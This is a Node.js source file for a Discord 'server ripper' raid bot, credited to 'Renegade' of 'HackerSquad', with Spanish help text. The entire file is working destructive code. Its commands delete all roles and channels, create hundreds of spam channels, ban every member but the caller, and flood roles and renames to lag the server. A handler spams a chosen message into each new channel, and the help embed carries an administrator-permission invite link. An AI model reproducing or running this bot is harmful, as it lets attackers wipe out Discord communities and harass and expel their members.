const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require("chalk");
const prompt = require("prompt-sync");
console.log(chalk.red(`

██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░░██████╗░██████╗░██╗░░░██╗░█████╗░██████╗░
██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗██╔════╝██╔═══██╗██║░░░██║██╔══██╗██╔══██╗
███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝╚█████╗░██║██╗██║██║░░░██║███████║██║░░██║
██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗░╚═══██╗╚██████╔╝██║░░░██║██╔══██║██║░░██║
██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║██████╔╝░╚═██╔═╝░╚██████╔╝██║░░██║██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░░╚═════╝░╚═╝░░╚═╝╚═════╝░

░█████╗░██╗░░░██╗░██████╗████████╗░█████╗░███╗░░░███╗
██╔══██╗██║░░░██║██╔════╝╚══██╔══╝██╔══██╗████╗░████║
██║░░╚═╝██║░░░██║╚█████╗░░░░██║░░░██║░░██║██╔████╔██║
██║░░██╗██║░░░██║░╚═══██╗░░░██║░░░██║░░██║██║╚██╔╝██║
╚█████╔╝╚██████╔╝██████╔╝░░░██║░░░╚█████╔╝██║░╚═╝░██║
░╚════╝░░╚═════╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝

██████╗░░█████╗░██╗██████╗░██████╗░░█████╗░████████╗
██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
██████╔╝███████║██║██║░░██║██████╦╝██║░░██║░░░██║░░░
██╔══██╗██╔══██║██║██║░░██║██╔══██╗██║░░██║░░░██║░░░
██║░░██║██║░░██║██║██████╔╝██████╦╝╚█████╔╝░░░██║░░░
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═════╝░░╚════╝░░░░╚═╝░░░

By Renegade`))
const prefix = prompt("Bot Prefix : ");
const token = prompt("Bot Token : ");
const presence = prompt("Bot Game : ");
const servername = prompt("Type the server name : ");
const channelName = prompt("Type the channel name : ");
const messageSpam = prompt("Type the message to Spam : ");

client.on("ready", ready => {
  console.log(`Server Ripper iniciado por : ${client.user.tag} By HackerSquad ( Renegade )`);
  client.user.setPresence({
    status: "dnd",
    activity: {
      name: presence,
      type: "LISTENING",
    }
  }).then(() => console.log(`Presencia cargada a el Bot : ${client.user.tag}`));
});

client.on("message", async message => {
  if(message.content === prefix + "auto") {
    await message.guild.roles.cache.forEach(r => r.delete());
    await message.guild.channels.cache.forEach(c => c.delete());
    await message.guild.setName(servername);
    for(let i = 0; i <= 500; i++) {
     message.guild.channels.create(channelName);
    }
  }

  if(message.content === prefix + "down") {
    let role = await message.guild.roles.create({
      data: {
        name: "Dwned",
        hoist: true,
        color: "BLACK",
      }
    });
    message.guild.members.cache.forEach(m => {
      if(m.id !== message.author.id) {
        m.roles.add(role);
        console.log(`Rol Down Agregado a ${m.user.tag}`);
      }
    });
  }

  if(message.content === prefix + "ban") {
    message.guild.members.cache.forEach(m => {
    if(m.id !== message.author.id) {
        m.ban();
        console.log(`El usuario ${m.user.tag} fue baneado`);
    }
  })
  }

  if(message.content === prefix + "lag") {
    for(let i = 0; i <= 250; i++) {
      message.guild.roles.create({ data: { name: "Hker$hit", color: "BLACK"} });
      message.guild.setName("HkerShit");
      message.guild.setName("HackerSquad - Attack");
    }
  }
  
  if(message.content === prefix + "help") {
    const embed = new Discord.MessageEmbed()
    .setTitle("Cookies Commands")
    .setDescription("HackerSquad Bot From GitHubt\n[Invitame a tu servidor](https://discord.com/api/oauth2/authorize?client_id=886622778176974858&permissions=8&scope=bot)")
    .addFields(
      { name: "`auto`", value: "Raidea el servidor", inline: false },
      { name: "`down`", value: "Crea un rol de Down y se lo pone a todo el mundo", inline: false },
      { name: "`ban`", value: "Banea a todo el mundo menos a el ejecutor de el mensaje", inline: false },
      { name: "`lag`", value: "Lagea el servidor ( Crea roles etc.. )", inline: false },
      { name: "`help`", value: "Manda este mensaje", inline: false }
    )
    .setColor("BLACK");
    message.channel.send(embed)
  }
});

client.on("channelCreate", channel => {
  for(let i = 0; i <= 15; i++) {
    channel.send(messageSpam)
  }
});


client.login(token)
